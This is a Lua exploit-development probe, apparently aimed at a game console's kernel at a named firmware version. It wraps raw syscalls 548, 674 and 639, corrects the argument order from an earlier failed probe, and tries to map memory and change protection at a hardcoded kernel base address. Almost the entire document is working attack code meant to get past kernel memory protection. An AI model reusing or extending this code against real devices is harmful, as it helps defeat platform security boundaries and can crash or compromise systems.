-- CRASH_CLASS: MODERATE
-- PROBE 822b: sys 548 argument order and a real mapping, then the kernel range
--
-- 822a passed the entry array as argument 3 and the count as argument 4 and
-- every call returned 0 with no mapping, because the body reads [uap+0x10]
-- for the array and [uap+0x18] for the count. Correct order:
--   548(flags, flags2, entries, count, out)
-- [A] maps a fresh user VA and proves 674 sees one more region. [B] maps at
-- the 13.60 kernel base. [C] updates protection / deletes at the kernel base.

print("=== PROBE 822b: sys 548, corrected arguments ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u(v)
    if type(v) == "table" then
        return uint64(to_num(v.h or 0)) * uint64(4294967296) + uint64(to_num(v.l or 0))
    end
    return uint64(v)
end
local function hx(v)
    if type(v) == "table" then
        return string.format("%08X%08X", to_num(v.h or 0), to_num(v.l or 0))
    end
    return string.format("%016X", v)
end
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return nil end
local function safe_wd(a, v) return (pcall(function() memory.write_dword(a, v) end)) end
local function safe_wq(a, v) return (pcall(function() memory.write_qword(a, v) end)) end

local sc548 = make_syscall(548)
local sc674 = make_syscall(674)
local sc639 = make_syscall(639)

local mapbuf = memory.alloc(0x10000)
local cnt = memory.alloc(8)
local function regions()
    safe_wd(cnt, 0)
    local ok = pcall(function() sc674(u(mapbuf), u(72), u(512), u(cnt), u(0x40000000), u(0)) end)
    return ok and (safe_rd(cnt) or -1) or -1
end
local function record(addr)
    local off, rec, st = memory.alloc(8), memory.alloc(16), memory.alloc(8)
    safe_wq(off, uint64(0)); safe_wq(off + 8, uint64(0))
    safe_wq(rec, uint64(0)); safe_wq(rec + 8, uint64(0)); safe_wq(off - 0, uint64(0))
    safe_wd(st, 0)
    local r = -99
    pcall(function() r = to_num(sc639(u(addr), u(0), u(off), u(rec), u(st))) end)
    return r, safe_rd(rec), safe_rd(rec + 4), safe_rd(rec + 8), safe_rd(st)
end

local ent = memory.alloc(0x40)
local function set_entry(start, len, prot, typ, flags, op)
    safe_wq(ent + 0x00, u(start))
    safe_wq(ent + 0x08, u(len))
    safe_wd(ent + 0x10, prot)
    safe_wd(ent + 0x14, typ)
    safe_wd(ent + 0x18, flags)
    safe_wd(ent + 0x1C, op)
end
local function call548(start, len, prot, typ, flags, op)
    set_entry(start, len, prot, typ, flags, op)
    local r = -99
    pcall(function() r = to_num(sc548(u(0), u(0), u(ent), u(1), u(0), u(0))) end)
    return r
end

local TARGET = 0x700000000
print(string.format("[0] regions=%d", regions()))
local r639, rb, rlen, rext, rst = record(TARGET)
print(string.format("[0] 639 target=%s ret=%d base=%s len=%s stat=%s", hx(TARGET), r639, tostring(rb), tostring(rlen), tostring(rst)))
print("")

print("[A] calling 548 op0 user target prot=3")
local r = call548(TARGET, 0x4000, 3, 0, 0, 0)
print(string.format("[A] ret=%d regions=%d", r, regions()))
local _, ab, alen, _, ast = record(TARGET)
print(string.format("[A] 639 after: base=%s len=%s stat=%s", tostring(ab), tostring(alen), tostring(ast)))
print(string.format("[A] write=%s read=%s", tostring(safe_wd(TARGET, 0x41424344)),
    safe_rd(TARGET) and string.format("%08X", safe_rd(TARGET)) or "nil"))
print("")

print("[B] calling 548 op0 at kbase prot=3")
local k = call548(0xFFFFFFFF8A9C0000, 0x4000, 3, 0, 0, 0)
print(string.format("[B] ret=%d regions=%d", k, regions()))
print("")

print("[C] calling 548 op2 (protection) at kbase")
local p2 = call548(0xFFFFFFFF8A9C0000, 0x4000, 3, 0, 0, 2)
print(string.format("[C] ret=%d regions=%d", p2, regions()))
print("[D] survived")
